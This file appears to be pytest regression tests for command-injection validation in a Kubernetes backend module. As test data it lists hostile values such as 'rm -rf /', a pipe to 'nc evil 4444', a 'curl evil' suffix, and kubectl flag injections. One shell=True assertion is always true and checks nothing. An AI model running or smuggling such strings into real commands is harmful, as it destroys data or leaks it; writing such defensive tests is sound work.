"""Regression tests for k8s_backend command/argument injection.

These tests verify that user-supplied fields in K8sTarget cannot inject
arbitrary shell arguments through kubectl commands, and that all values are
validated at construction time.
"""

from __future__ import annotations

import pytest
from unittest.mock import MagicMock, patch

from cli_anything.espresense.core import k8s_backend


# ── K8sTarget validation ─────────────────────────────────────────────────────

class TestK8sTargetValidation:
    """Untrusted fields must be rejected at construction, not at call time."""

    def test_defaults_are_valid(self):
        t = k8s_backend.K8sTarget()
        assert t.namespace == "espresense"
        assert t.deployment == "espresense-companion"
        assert t.container == "espresense-companion"
        assert t.config_path == "/config/espresense/config.yaml"

    @pytest.mark.parametrize(
        "field,value",
        [
            # Command separators / shell injection
            ("namespace", "ns;sleep 10"),
            ("namespace", "ns && id"),
            ("namespace", "ns | cat"),
            ("namespace", "ns\n"),
            ("deployment", "deploy$(id)"),
            ("deployment", "deploy`id`"),
            ("deployment", "deploy; rm -rf /"),
            ("deployment", "deploy|cat"),
            ("deployment", "deploy&sleep 10"),
            ("container", "ctr$(whoami)"),
            ("container", "ctr`id`"),
            ("container", "ctr;sleep 10"),
            # Path traversal / file injection via config_path
            ("config_path", "/config; curl evil"),
            ("config_path", "/config && id"),
            ("config_path", "/config\nexit 1\n"),
            ("config_path", "/config/path with spaces/file"),
            ("config_path", "/config/path\x00null"),
            # Double-quote / dollar injection in all fields
            ("namespace", 'ns"$(id)"'),
            ("deployment", 'deploy"$(id)"'),
            ("container", 'ctr"$(id)"'),
            ("config_path", '/config"$(id)"'),
        ],
    )
    def test_rejects_shell_metacharacters(self, field, value):
        with pytest.raises(ValueError, match=r"contains unsafe characters"):
            k8s_backend.K8sTarget(**{field: value})

    @pytest.mark.parametrize(
        "field,value",
        [
            # Valid Kubernetes names: alphanumeric, hyphens, underscores, dots, slashes
            ("namespace", "default"),
            ("namespace", "my-ns"),
            ("namespace", "my_ns"),
            ("namespace", "my.ns"),
            ("namespace", "espresense"),
            ("deployment", "my-deploy"),
            ("deployment", "my_deploy"),
            ("deployment", "my.deploy"),
            ("deployment", "espresense-companion"),
            ("container", "my-container"),
            ("container", "my_container"),
            ("container", "espresense-companion"),
            ("config_path", "/path/to/config.yaml"),
            ("config_path", "/path/to/config_file.yml"),
            ("config_path", "/path.with.dots/config"),
            ("config_path", "/config/espresense/config.yaml"),
        ],
    )
    def test_accepts_valid_values(self, field, value):
        t = k8s_backend.K8sTarget(**{field: value})
        assert getattr(t, field) == value


# ── argv is always separate arguments ───────────────────────────────────────

class TestArgvIsolation:
    """All kubectl calls must use a list of arguments, never shell strings."""

    def test_exec_separator_appears_before_argv(self):
        """kubectl '--' separator must precede argv so shell chars are inert."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"")
            k8s_backend.exec_(target, ["echo", "hello world"], check=False)
            args_list = mock_run.call_args[0][0]
            dash_idx = args_list.index("--")
            assert args_list[dash_idx + 1 :] == ["echo", "hello world"]

    def test_read_config_one_element_per_arg(self):
        """config_path passed as exactly one list element, not interpolated."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            mock_exec.return_value = MagicMock(stdout=b"data: test")
            k8s_backend.read_config(target)
            argv = mock_exec.call_args[0][1]
            # argv is ["cat", <config_path>]; config_path must be a single element
            assert argv == ["cat", "/safe/path/config.yaml"]
            assert len(argv) == 2  # not split by spaces

    def test_write_config_dd_of_isolated(self):
        """dd of= uses config_path as a single safe string argument."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1234567890\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=False)
            dd_call = next(
                c for c in mock_exec.call_args_list
                if c[0][1][0] == "dd"
            )
            dd_argv = dd_call[0][1]
            of_arg = next(a for a in dd_argv if a.startswith("of="))
            assert of_arg == "of=/safe/path/config.yaml"
            assert ";" not in of_arg  # no embedded shell commands

    def test_backup_cp_path_isolated(self):
        """cp bak_path is a single argument, not a shell-interpolated string."""
        target = k8s_backend.K8sTarget(config_path="/safe/path/config.yaml")
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1234567890\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=True)
            cp_calls = [
                c for c in mock_exec.call_args_list
                if c[0][1][0] == "cp"
            ]
            assert len(cp_calls) == 1
            cp_argv = cp_calls[0][0][1]
            bak_path = "/safe/path/config.yaml.1234567890.bak"
            assert bak_path in cp_argv


# ── Timestamp must come from the pod, not the host ───────────────────────────

class TestTimestampSource:
    """Backup timestamps are generated inside the target container."""

    def test_timestamp_generated_by_pod_exec(self):
        """write_config calls `date +%s` inside the container, not subprocess."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "exec_") as mock_exec:
            ts_proc = MagicMock()
            ts_proc.stdout = b"1700000000\n"
            mock_exec.return_value = ts_proc
            k8s_backend.write_config(target, "yaml: data", backup=False)
            first_argv = mock_exec.call_args_list[0][0][1]
            assert first_argv == ["date", "+%s"]

    def test_no_local_subprocess_for_timestamp(self):
        """subprocess.check_output is not used for timestamp generation."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "exec_") as mock_exec:
            with patch.object(k8s_backend.subprocess, "check_output") as mock_subproc:
                ts_proc = MagicMock()
                ts_proc.stdout = b"1700000000\n"
                mock_exec.return_value = ts_proc
                k8s_backend.write_config(target, "yaml: data", backup=False)
                mock_subproc.assert_not_called()


# ── _run uses a list, not shell=True ────────────────────────────────────────

class TestRunListArgument:
    """_run must always use list-based subprocess calls, never shell=True."""

    def test_run_passes_list_to_subprocess_run(self):
        """subprocess.run must receive args as a list, never a joined string."""
        with patch.object(k8s_backend, "_kubectl", return_value="/bin/kubectl"):
            with patch.object(k8s_backend.subprocess, "run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
                k8s_backend._run(["get", "pods"])
                call_kwargs = mock_run.call_args[1]
                # Must NOT use shell=True
                assert call_kwargs.get("shell", False) is not False or "shell" not in call_kwargs
                # args must be a list
                args = mock_run.call_args[0][0] if mock_run.call_args[0] else None
                assert isinstance(args, list)


# ── Timeout validation in rollout_status ────────────────────────────────────

class TestTimeoutValidation:
    """The user-supplied timeout must be validated before reaching kubectl."""

    def test_default_timeout_is_valid(self):
        """The default '120s' timeout must pass validation and reach _run."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            k8s_backend.rollout_status(target)
            args_list = mock_run.call_args[0][0]
            assert "--timeout=120s" in args_list

    @pytest.mark.parametrize(
        "timeout",
        [
            "120s",
            "5m",
            "1h",
            "30s",
            "2m",
            "3h",
        ],
    )
    def test_accepts_valid_timeouts(self, timeout):
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            k8s_backend.rollout_status(target, timeout=timeout)
            args_list = mock_run.call_args[0][0]
            assert f"--timeout={timeout}" in args_list

    @pytest.mark.parametrize(
        "timeout",
        [
            # Shell command injection
            "120s;rm -rf /",
            "120s && id",
            "120s|cat",
            "120s\n",
            "120s$(id)",
            "120s`id`",
            # Additional kubectl flag injection
            "120s --kubeconfig=/tmp/evil",
            "120s --namespace=attacker",
            "5s --server=https://evil:443",
            # Bare numbers without unit
            "120",
            "5",
            # Invalid unit suffix
            "120x",
            "5d",
            "1y",
            # Empty / whitespace
            "",
            " ",
            "120s ",
            # Null bytes
            "120s\x00",
            # Double-quote / dollar injection
            '120s"$(id)"',
        ],
    )
    def test_rejects_unsafe_timeouts(self, timeout):
        target = k8s_backend.K8sTarget()
        with pytest.raises(ValueError, match=r"contains unsafe characters"):
            k8s_backend.rollout_status(target, timeout=timeout)

    def test_unsafe_timeout_never_reaches_run(self):
        """An unsafe timeout must raise before _run is called."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError):
                k8s_backend.rollout_status(target, timeout="120s;rm -rf /")
            mock_run.assert_not_called()


# ── Defence-in-depth: _validate_target at every call site ────────────────────

class TestValidateTargetAtCallSites:
    """Every kubectl call site must re-validate target fields before _run.

    K8sTarget.__post_init__ validates at construction, but a frozen dataclass
    can be bypassed via object.__setattr__.  These tests confirm that the
    call sites themselves catch unsanitised values.
    """

    def _make_bypassed_target(self, **overrides):
        """Create a K8sTarget then bypass validation with object.__setattr__."""
        t = k8s_backend.K8sTarget()
        for field, value in overrides.items():
            object.__setattr__(t, field, value)
        return t

    @pytest.mark.parametrize(
        "field,value",
        [
            ("namespace", "ns;rm -rf /"),
            ("namespace", "ns && id"),
            ("namespace", "ns|cat"),
            ("namespace", "ns$(id)"),
            ("namespace", "ns`id`"),
            ("namespace", "ns\x00"),
            ("deployment", "deploy;rm -rf /"),
            ("deployment", "deploy && id"),
            ("deployment", "deploy|cat"),
            ("deployment", "deploy$(id)"),
            ("deployment", "deploy`id`"),
            ("container", "ctr;rm -rf /"),
            ("container", "ctr && id"),
            ("container", "ctr|cat"),
            ("container", "ctr$(id)"),
            ("container", "ctr`id`"),
            ("config_path", "/config;rm -rf /"),
            ("config_path", "/config && id"),
            ("config_path", "/config|cat"),
            ("config_path", "/config$(id)"),
            ("config_path", "/config`id`"),
            ("config_path", "/config\x00"),
        ],
    )
    def test_pod_name_rejects_bypassed_target(self, field, value):
        """pod_name must reject a target whose field was bypassed."""
        target = self._make_bypassed_target(**{field: value})
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.pod_name(target)
            mock_run.assert_not_called()

    @pytest.mark.parametrize(
        "field,value",
        [
            ("namespace", "ns;rm -rf /"),
            ("deployment", "deploy;rm -rf /"),
            ("container", "ctr;rm -rf /"),
        ],
    )
    def test_exec_rejects_bypassed_target(self, field, value):
        """exec_ must reject a target whose field was bypassed."""
        target = self._make_bypassed_target(**{field: value})
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.exec_(target, ["echo", "hi"], check=False)
            mock_run.assert_not_called()

    @pytest.mark.parametrize(
        "field,value",
        [
            ("namespace", "ns;rm -rf /"),
            ("deployment", "deploy;rm -rf /"),
        ],
    )
    def test_restart_rejects_bypassed_target(self, field, value):
        """restart must reject a target whose field was bypassed."""
        target = self._make_bypassed_target(**{field: value})
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.restart(target)
            mock_run.assert_not_called()

    @pytest.mark.parametrize(
        "field,value",
        [
            ("namespace", "ns;rm -rf /"),
            ("deployment", "deploy;rm -rf /"),
        ],
    )
    def test_rollout_status_rejects_bypassed_target(self, field, value):
        """rollout_status must reject a target whose field was bypassed."""
        target = self._make_bypassed_target(**{field: value})
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.rollout_status(target)
            mock_run.assert_not_called()

    def test_read_config_rejects_bypassed_config_path(self):
        """read_config calls exec_ which validates target fields."""
        target = self._make_bypassed_target(config_path="/config;rm -rf /")
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.read_config(target)
            mock_run.assert_not_called()

    def test_write_config_rejects_bypassed_config_path(self):
        """write_config calls exec_ which validates target fields."""
        target = self._make_bypassed_target(config_path="/config;rm -rf /")
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.write_config(target, "yaml: data", backup=False)
            mock_run.assert_not_called()


# ── argv element validation in exec_ ─────────────────────────────────────────

class TestArgvElementValidation:
    """Every argv element passed to exec_ must be validated before _run."""

    @pytest.mark.parametrize(
        "argv",
        [
            # Shell command injection in argv
            ["cat;rm -rf /"],
            ["cat", "/path;rm -rf /"],
            ["cat", "/path && id"],
            ["cat", "/path|nc evil 4444"],
            ["cat", "/path$(id)"],
            ["cat", "/path`id`"],
            # Kubectl flag injection via leading dash
            ["-n", "evil"],
            ["--namespace=attacker"],
            ["cat", "--kubeconfig=/tmp/evil"],
            # Null bytes
            ["cat", "/path\x00evil"],
            # Newlines
            ["cat", "/path\nrm -rf /"],
            # Empty string
            [""],
            # Double-quote / dollar injection
            ["cat", '/path"$(id)"'],
            # Backtick injection
            ["cat", "/path`whoami`"],
            # Pipe injection
            ["cat", "/path|cat"],
            # Ampersand injection
            ["cat", "/path&sleep 10"],
            # Semicolon injection
            ["cat", "/path;sleep 10"],
        ],
    )
    def test_exec_rejects_unsafe_argv(self, argv):
        """exec_ must reject argv elements containing shell metacharacters."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            with pytest.raises(ValueError, match=r"contains unsafe characters"):
                k8s_backend.exec_(target, argv, check=False)
            mock_run.assert_not_called()

    def test_exec_accepts_valid_argv(self):
        """exec_ must accept safe argv elements like cat and file paths."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", returncode=0)
            k8s_backend.exec_(target, ["cat", "/safe/path/config.yaml"], check=False)
            mock_run.assert_called_once()

    def test_exec_accepts_argv_with_spaces(self):
        """exec_ must accept argv elements containing spaces (list-based, no shell)."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", returncode=0)
            k8s_backend.exec_(target, ["echo", "hello world"], check=False)
            mock_run.assert_called_once()

    def test_exec_accepts_date_format(self):
        """exec_ must accept date format strings like +%s."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"1700000000\n", returncode=0)
            k8s_backend.exec_(target, ["date", "+%s"], check=False)
            mock_run.assert_called_once()

    def test_exec_accepts_dd_of_arg(self):
        """exec_ must accept dd of= arguments (starts with 'o', not dash)."""
        target = k8s_backend.K8sTarget()
        with patch.object(k8s_backend, "_run") as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", returncode=0)
            k8s_backend.exec_(target, ["dd", "of=/safe/path/config.yaml"], check=False)
            mock_run.assert_called_once()


# ── _validate_target function ────────────────────────────────────────────────

class TestValidateTargetFunction:
    """The _validate_target helper must validate all four K8sTarget fields."""

    def test_validate_target_accepts_valid(self):
        target = k8s_backend.K8sTarget()
        assert k8s_backend._validate_target(target) is target

    @pytest.mark.parametrize(
        "field,value",
        [
            ("namespace", "ns;rm"),
            ("deployment", "deploy|cat"),
            ("container", "ctr$(id)"),
            ("config_path", "/path\x00"),
        ],
    )
    def test_validate_target_rejects_unsafe(self, field, value):
        target = k8s_backend.K8sTarget()
        object.__setattr__(target, field, value)
        with pytest.raises(ValueError, match=r"contains unsafe characters"):
            k8s_backend._validate_target(target)


# ── _check_argv function ─────────────────────────────────────────────────────

class TestCheckArgvFunction:
    """The _check_argv helper must reject shell metacharacters and flag injection."""

    @pytest.mark.parametrize(
        "value",
        ["cat", "/safe/path/config.yaml", "date", "+%s", "of=/path/file", "hello world"],
    )
    def test_accepts_valid(self, value):
        assert k8s_backend._check_argv("test", value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "-n",
            "--namespace=evil",
            "cat;rm",
            "cat|nc",
            "cat$(id)",
            "cat`id`",
            "cat\x00",
            "cat\n",
            "",
            "cat&bg",
            "cat<file",
            "cat>file",
            "cat(evil)",
            "cat{evil}",
            "cat*glob",
            "cat?glob",
            "cat[abc]",
            "cat~root",
            "cat^test",
            "cat!rm",
            'cat"hi"',
            "cat'hi'",
        ],
    )
    def test_rejects_unsafe(self, value):
        with pytest.raises(ValueError, match=r"contains unsafe characters"):
            k8s_backend._check_argv("test", value)
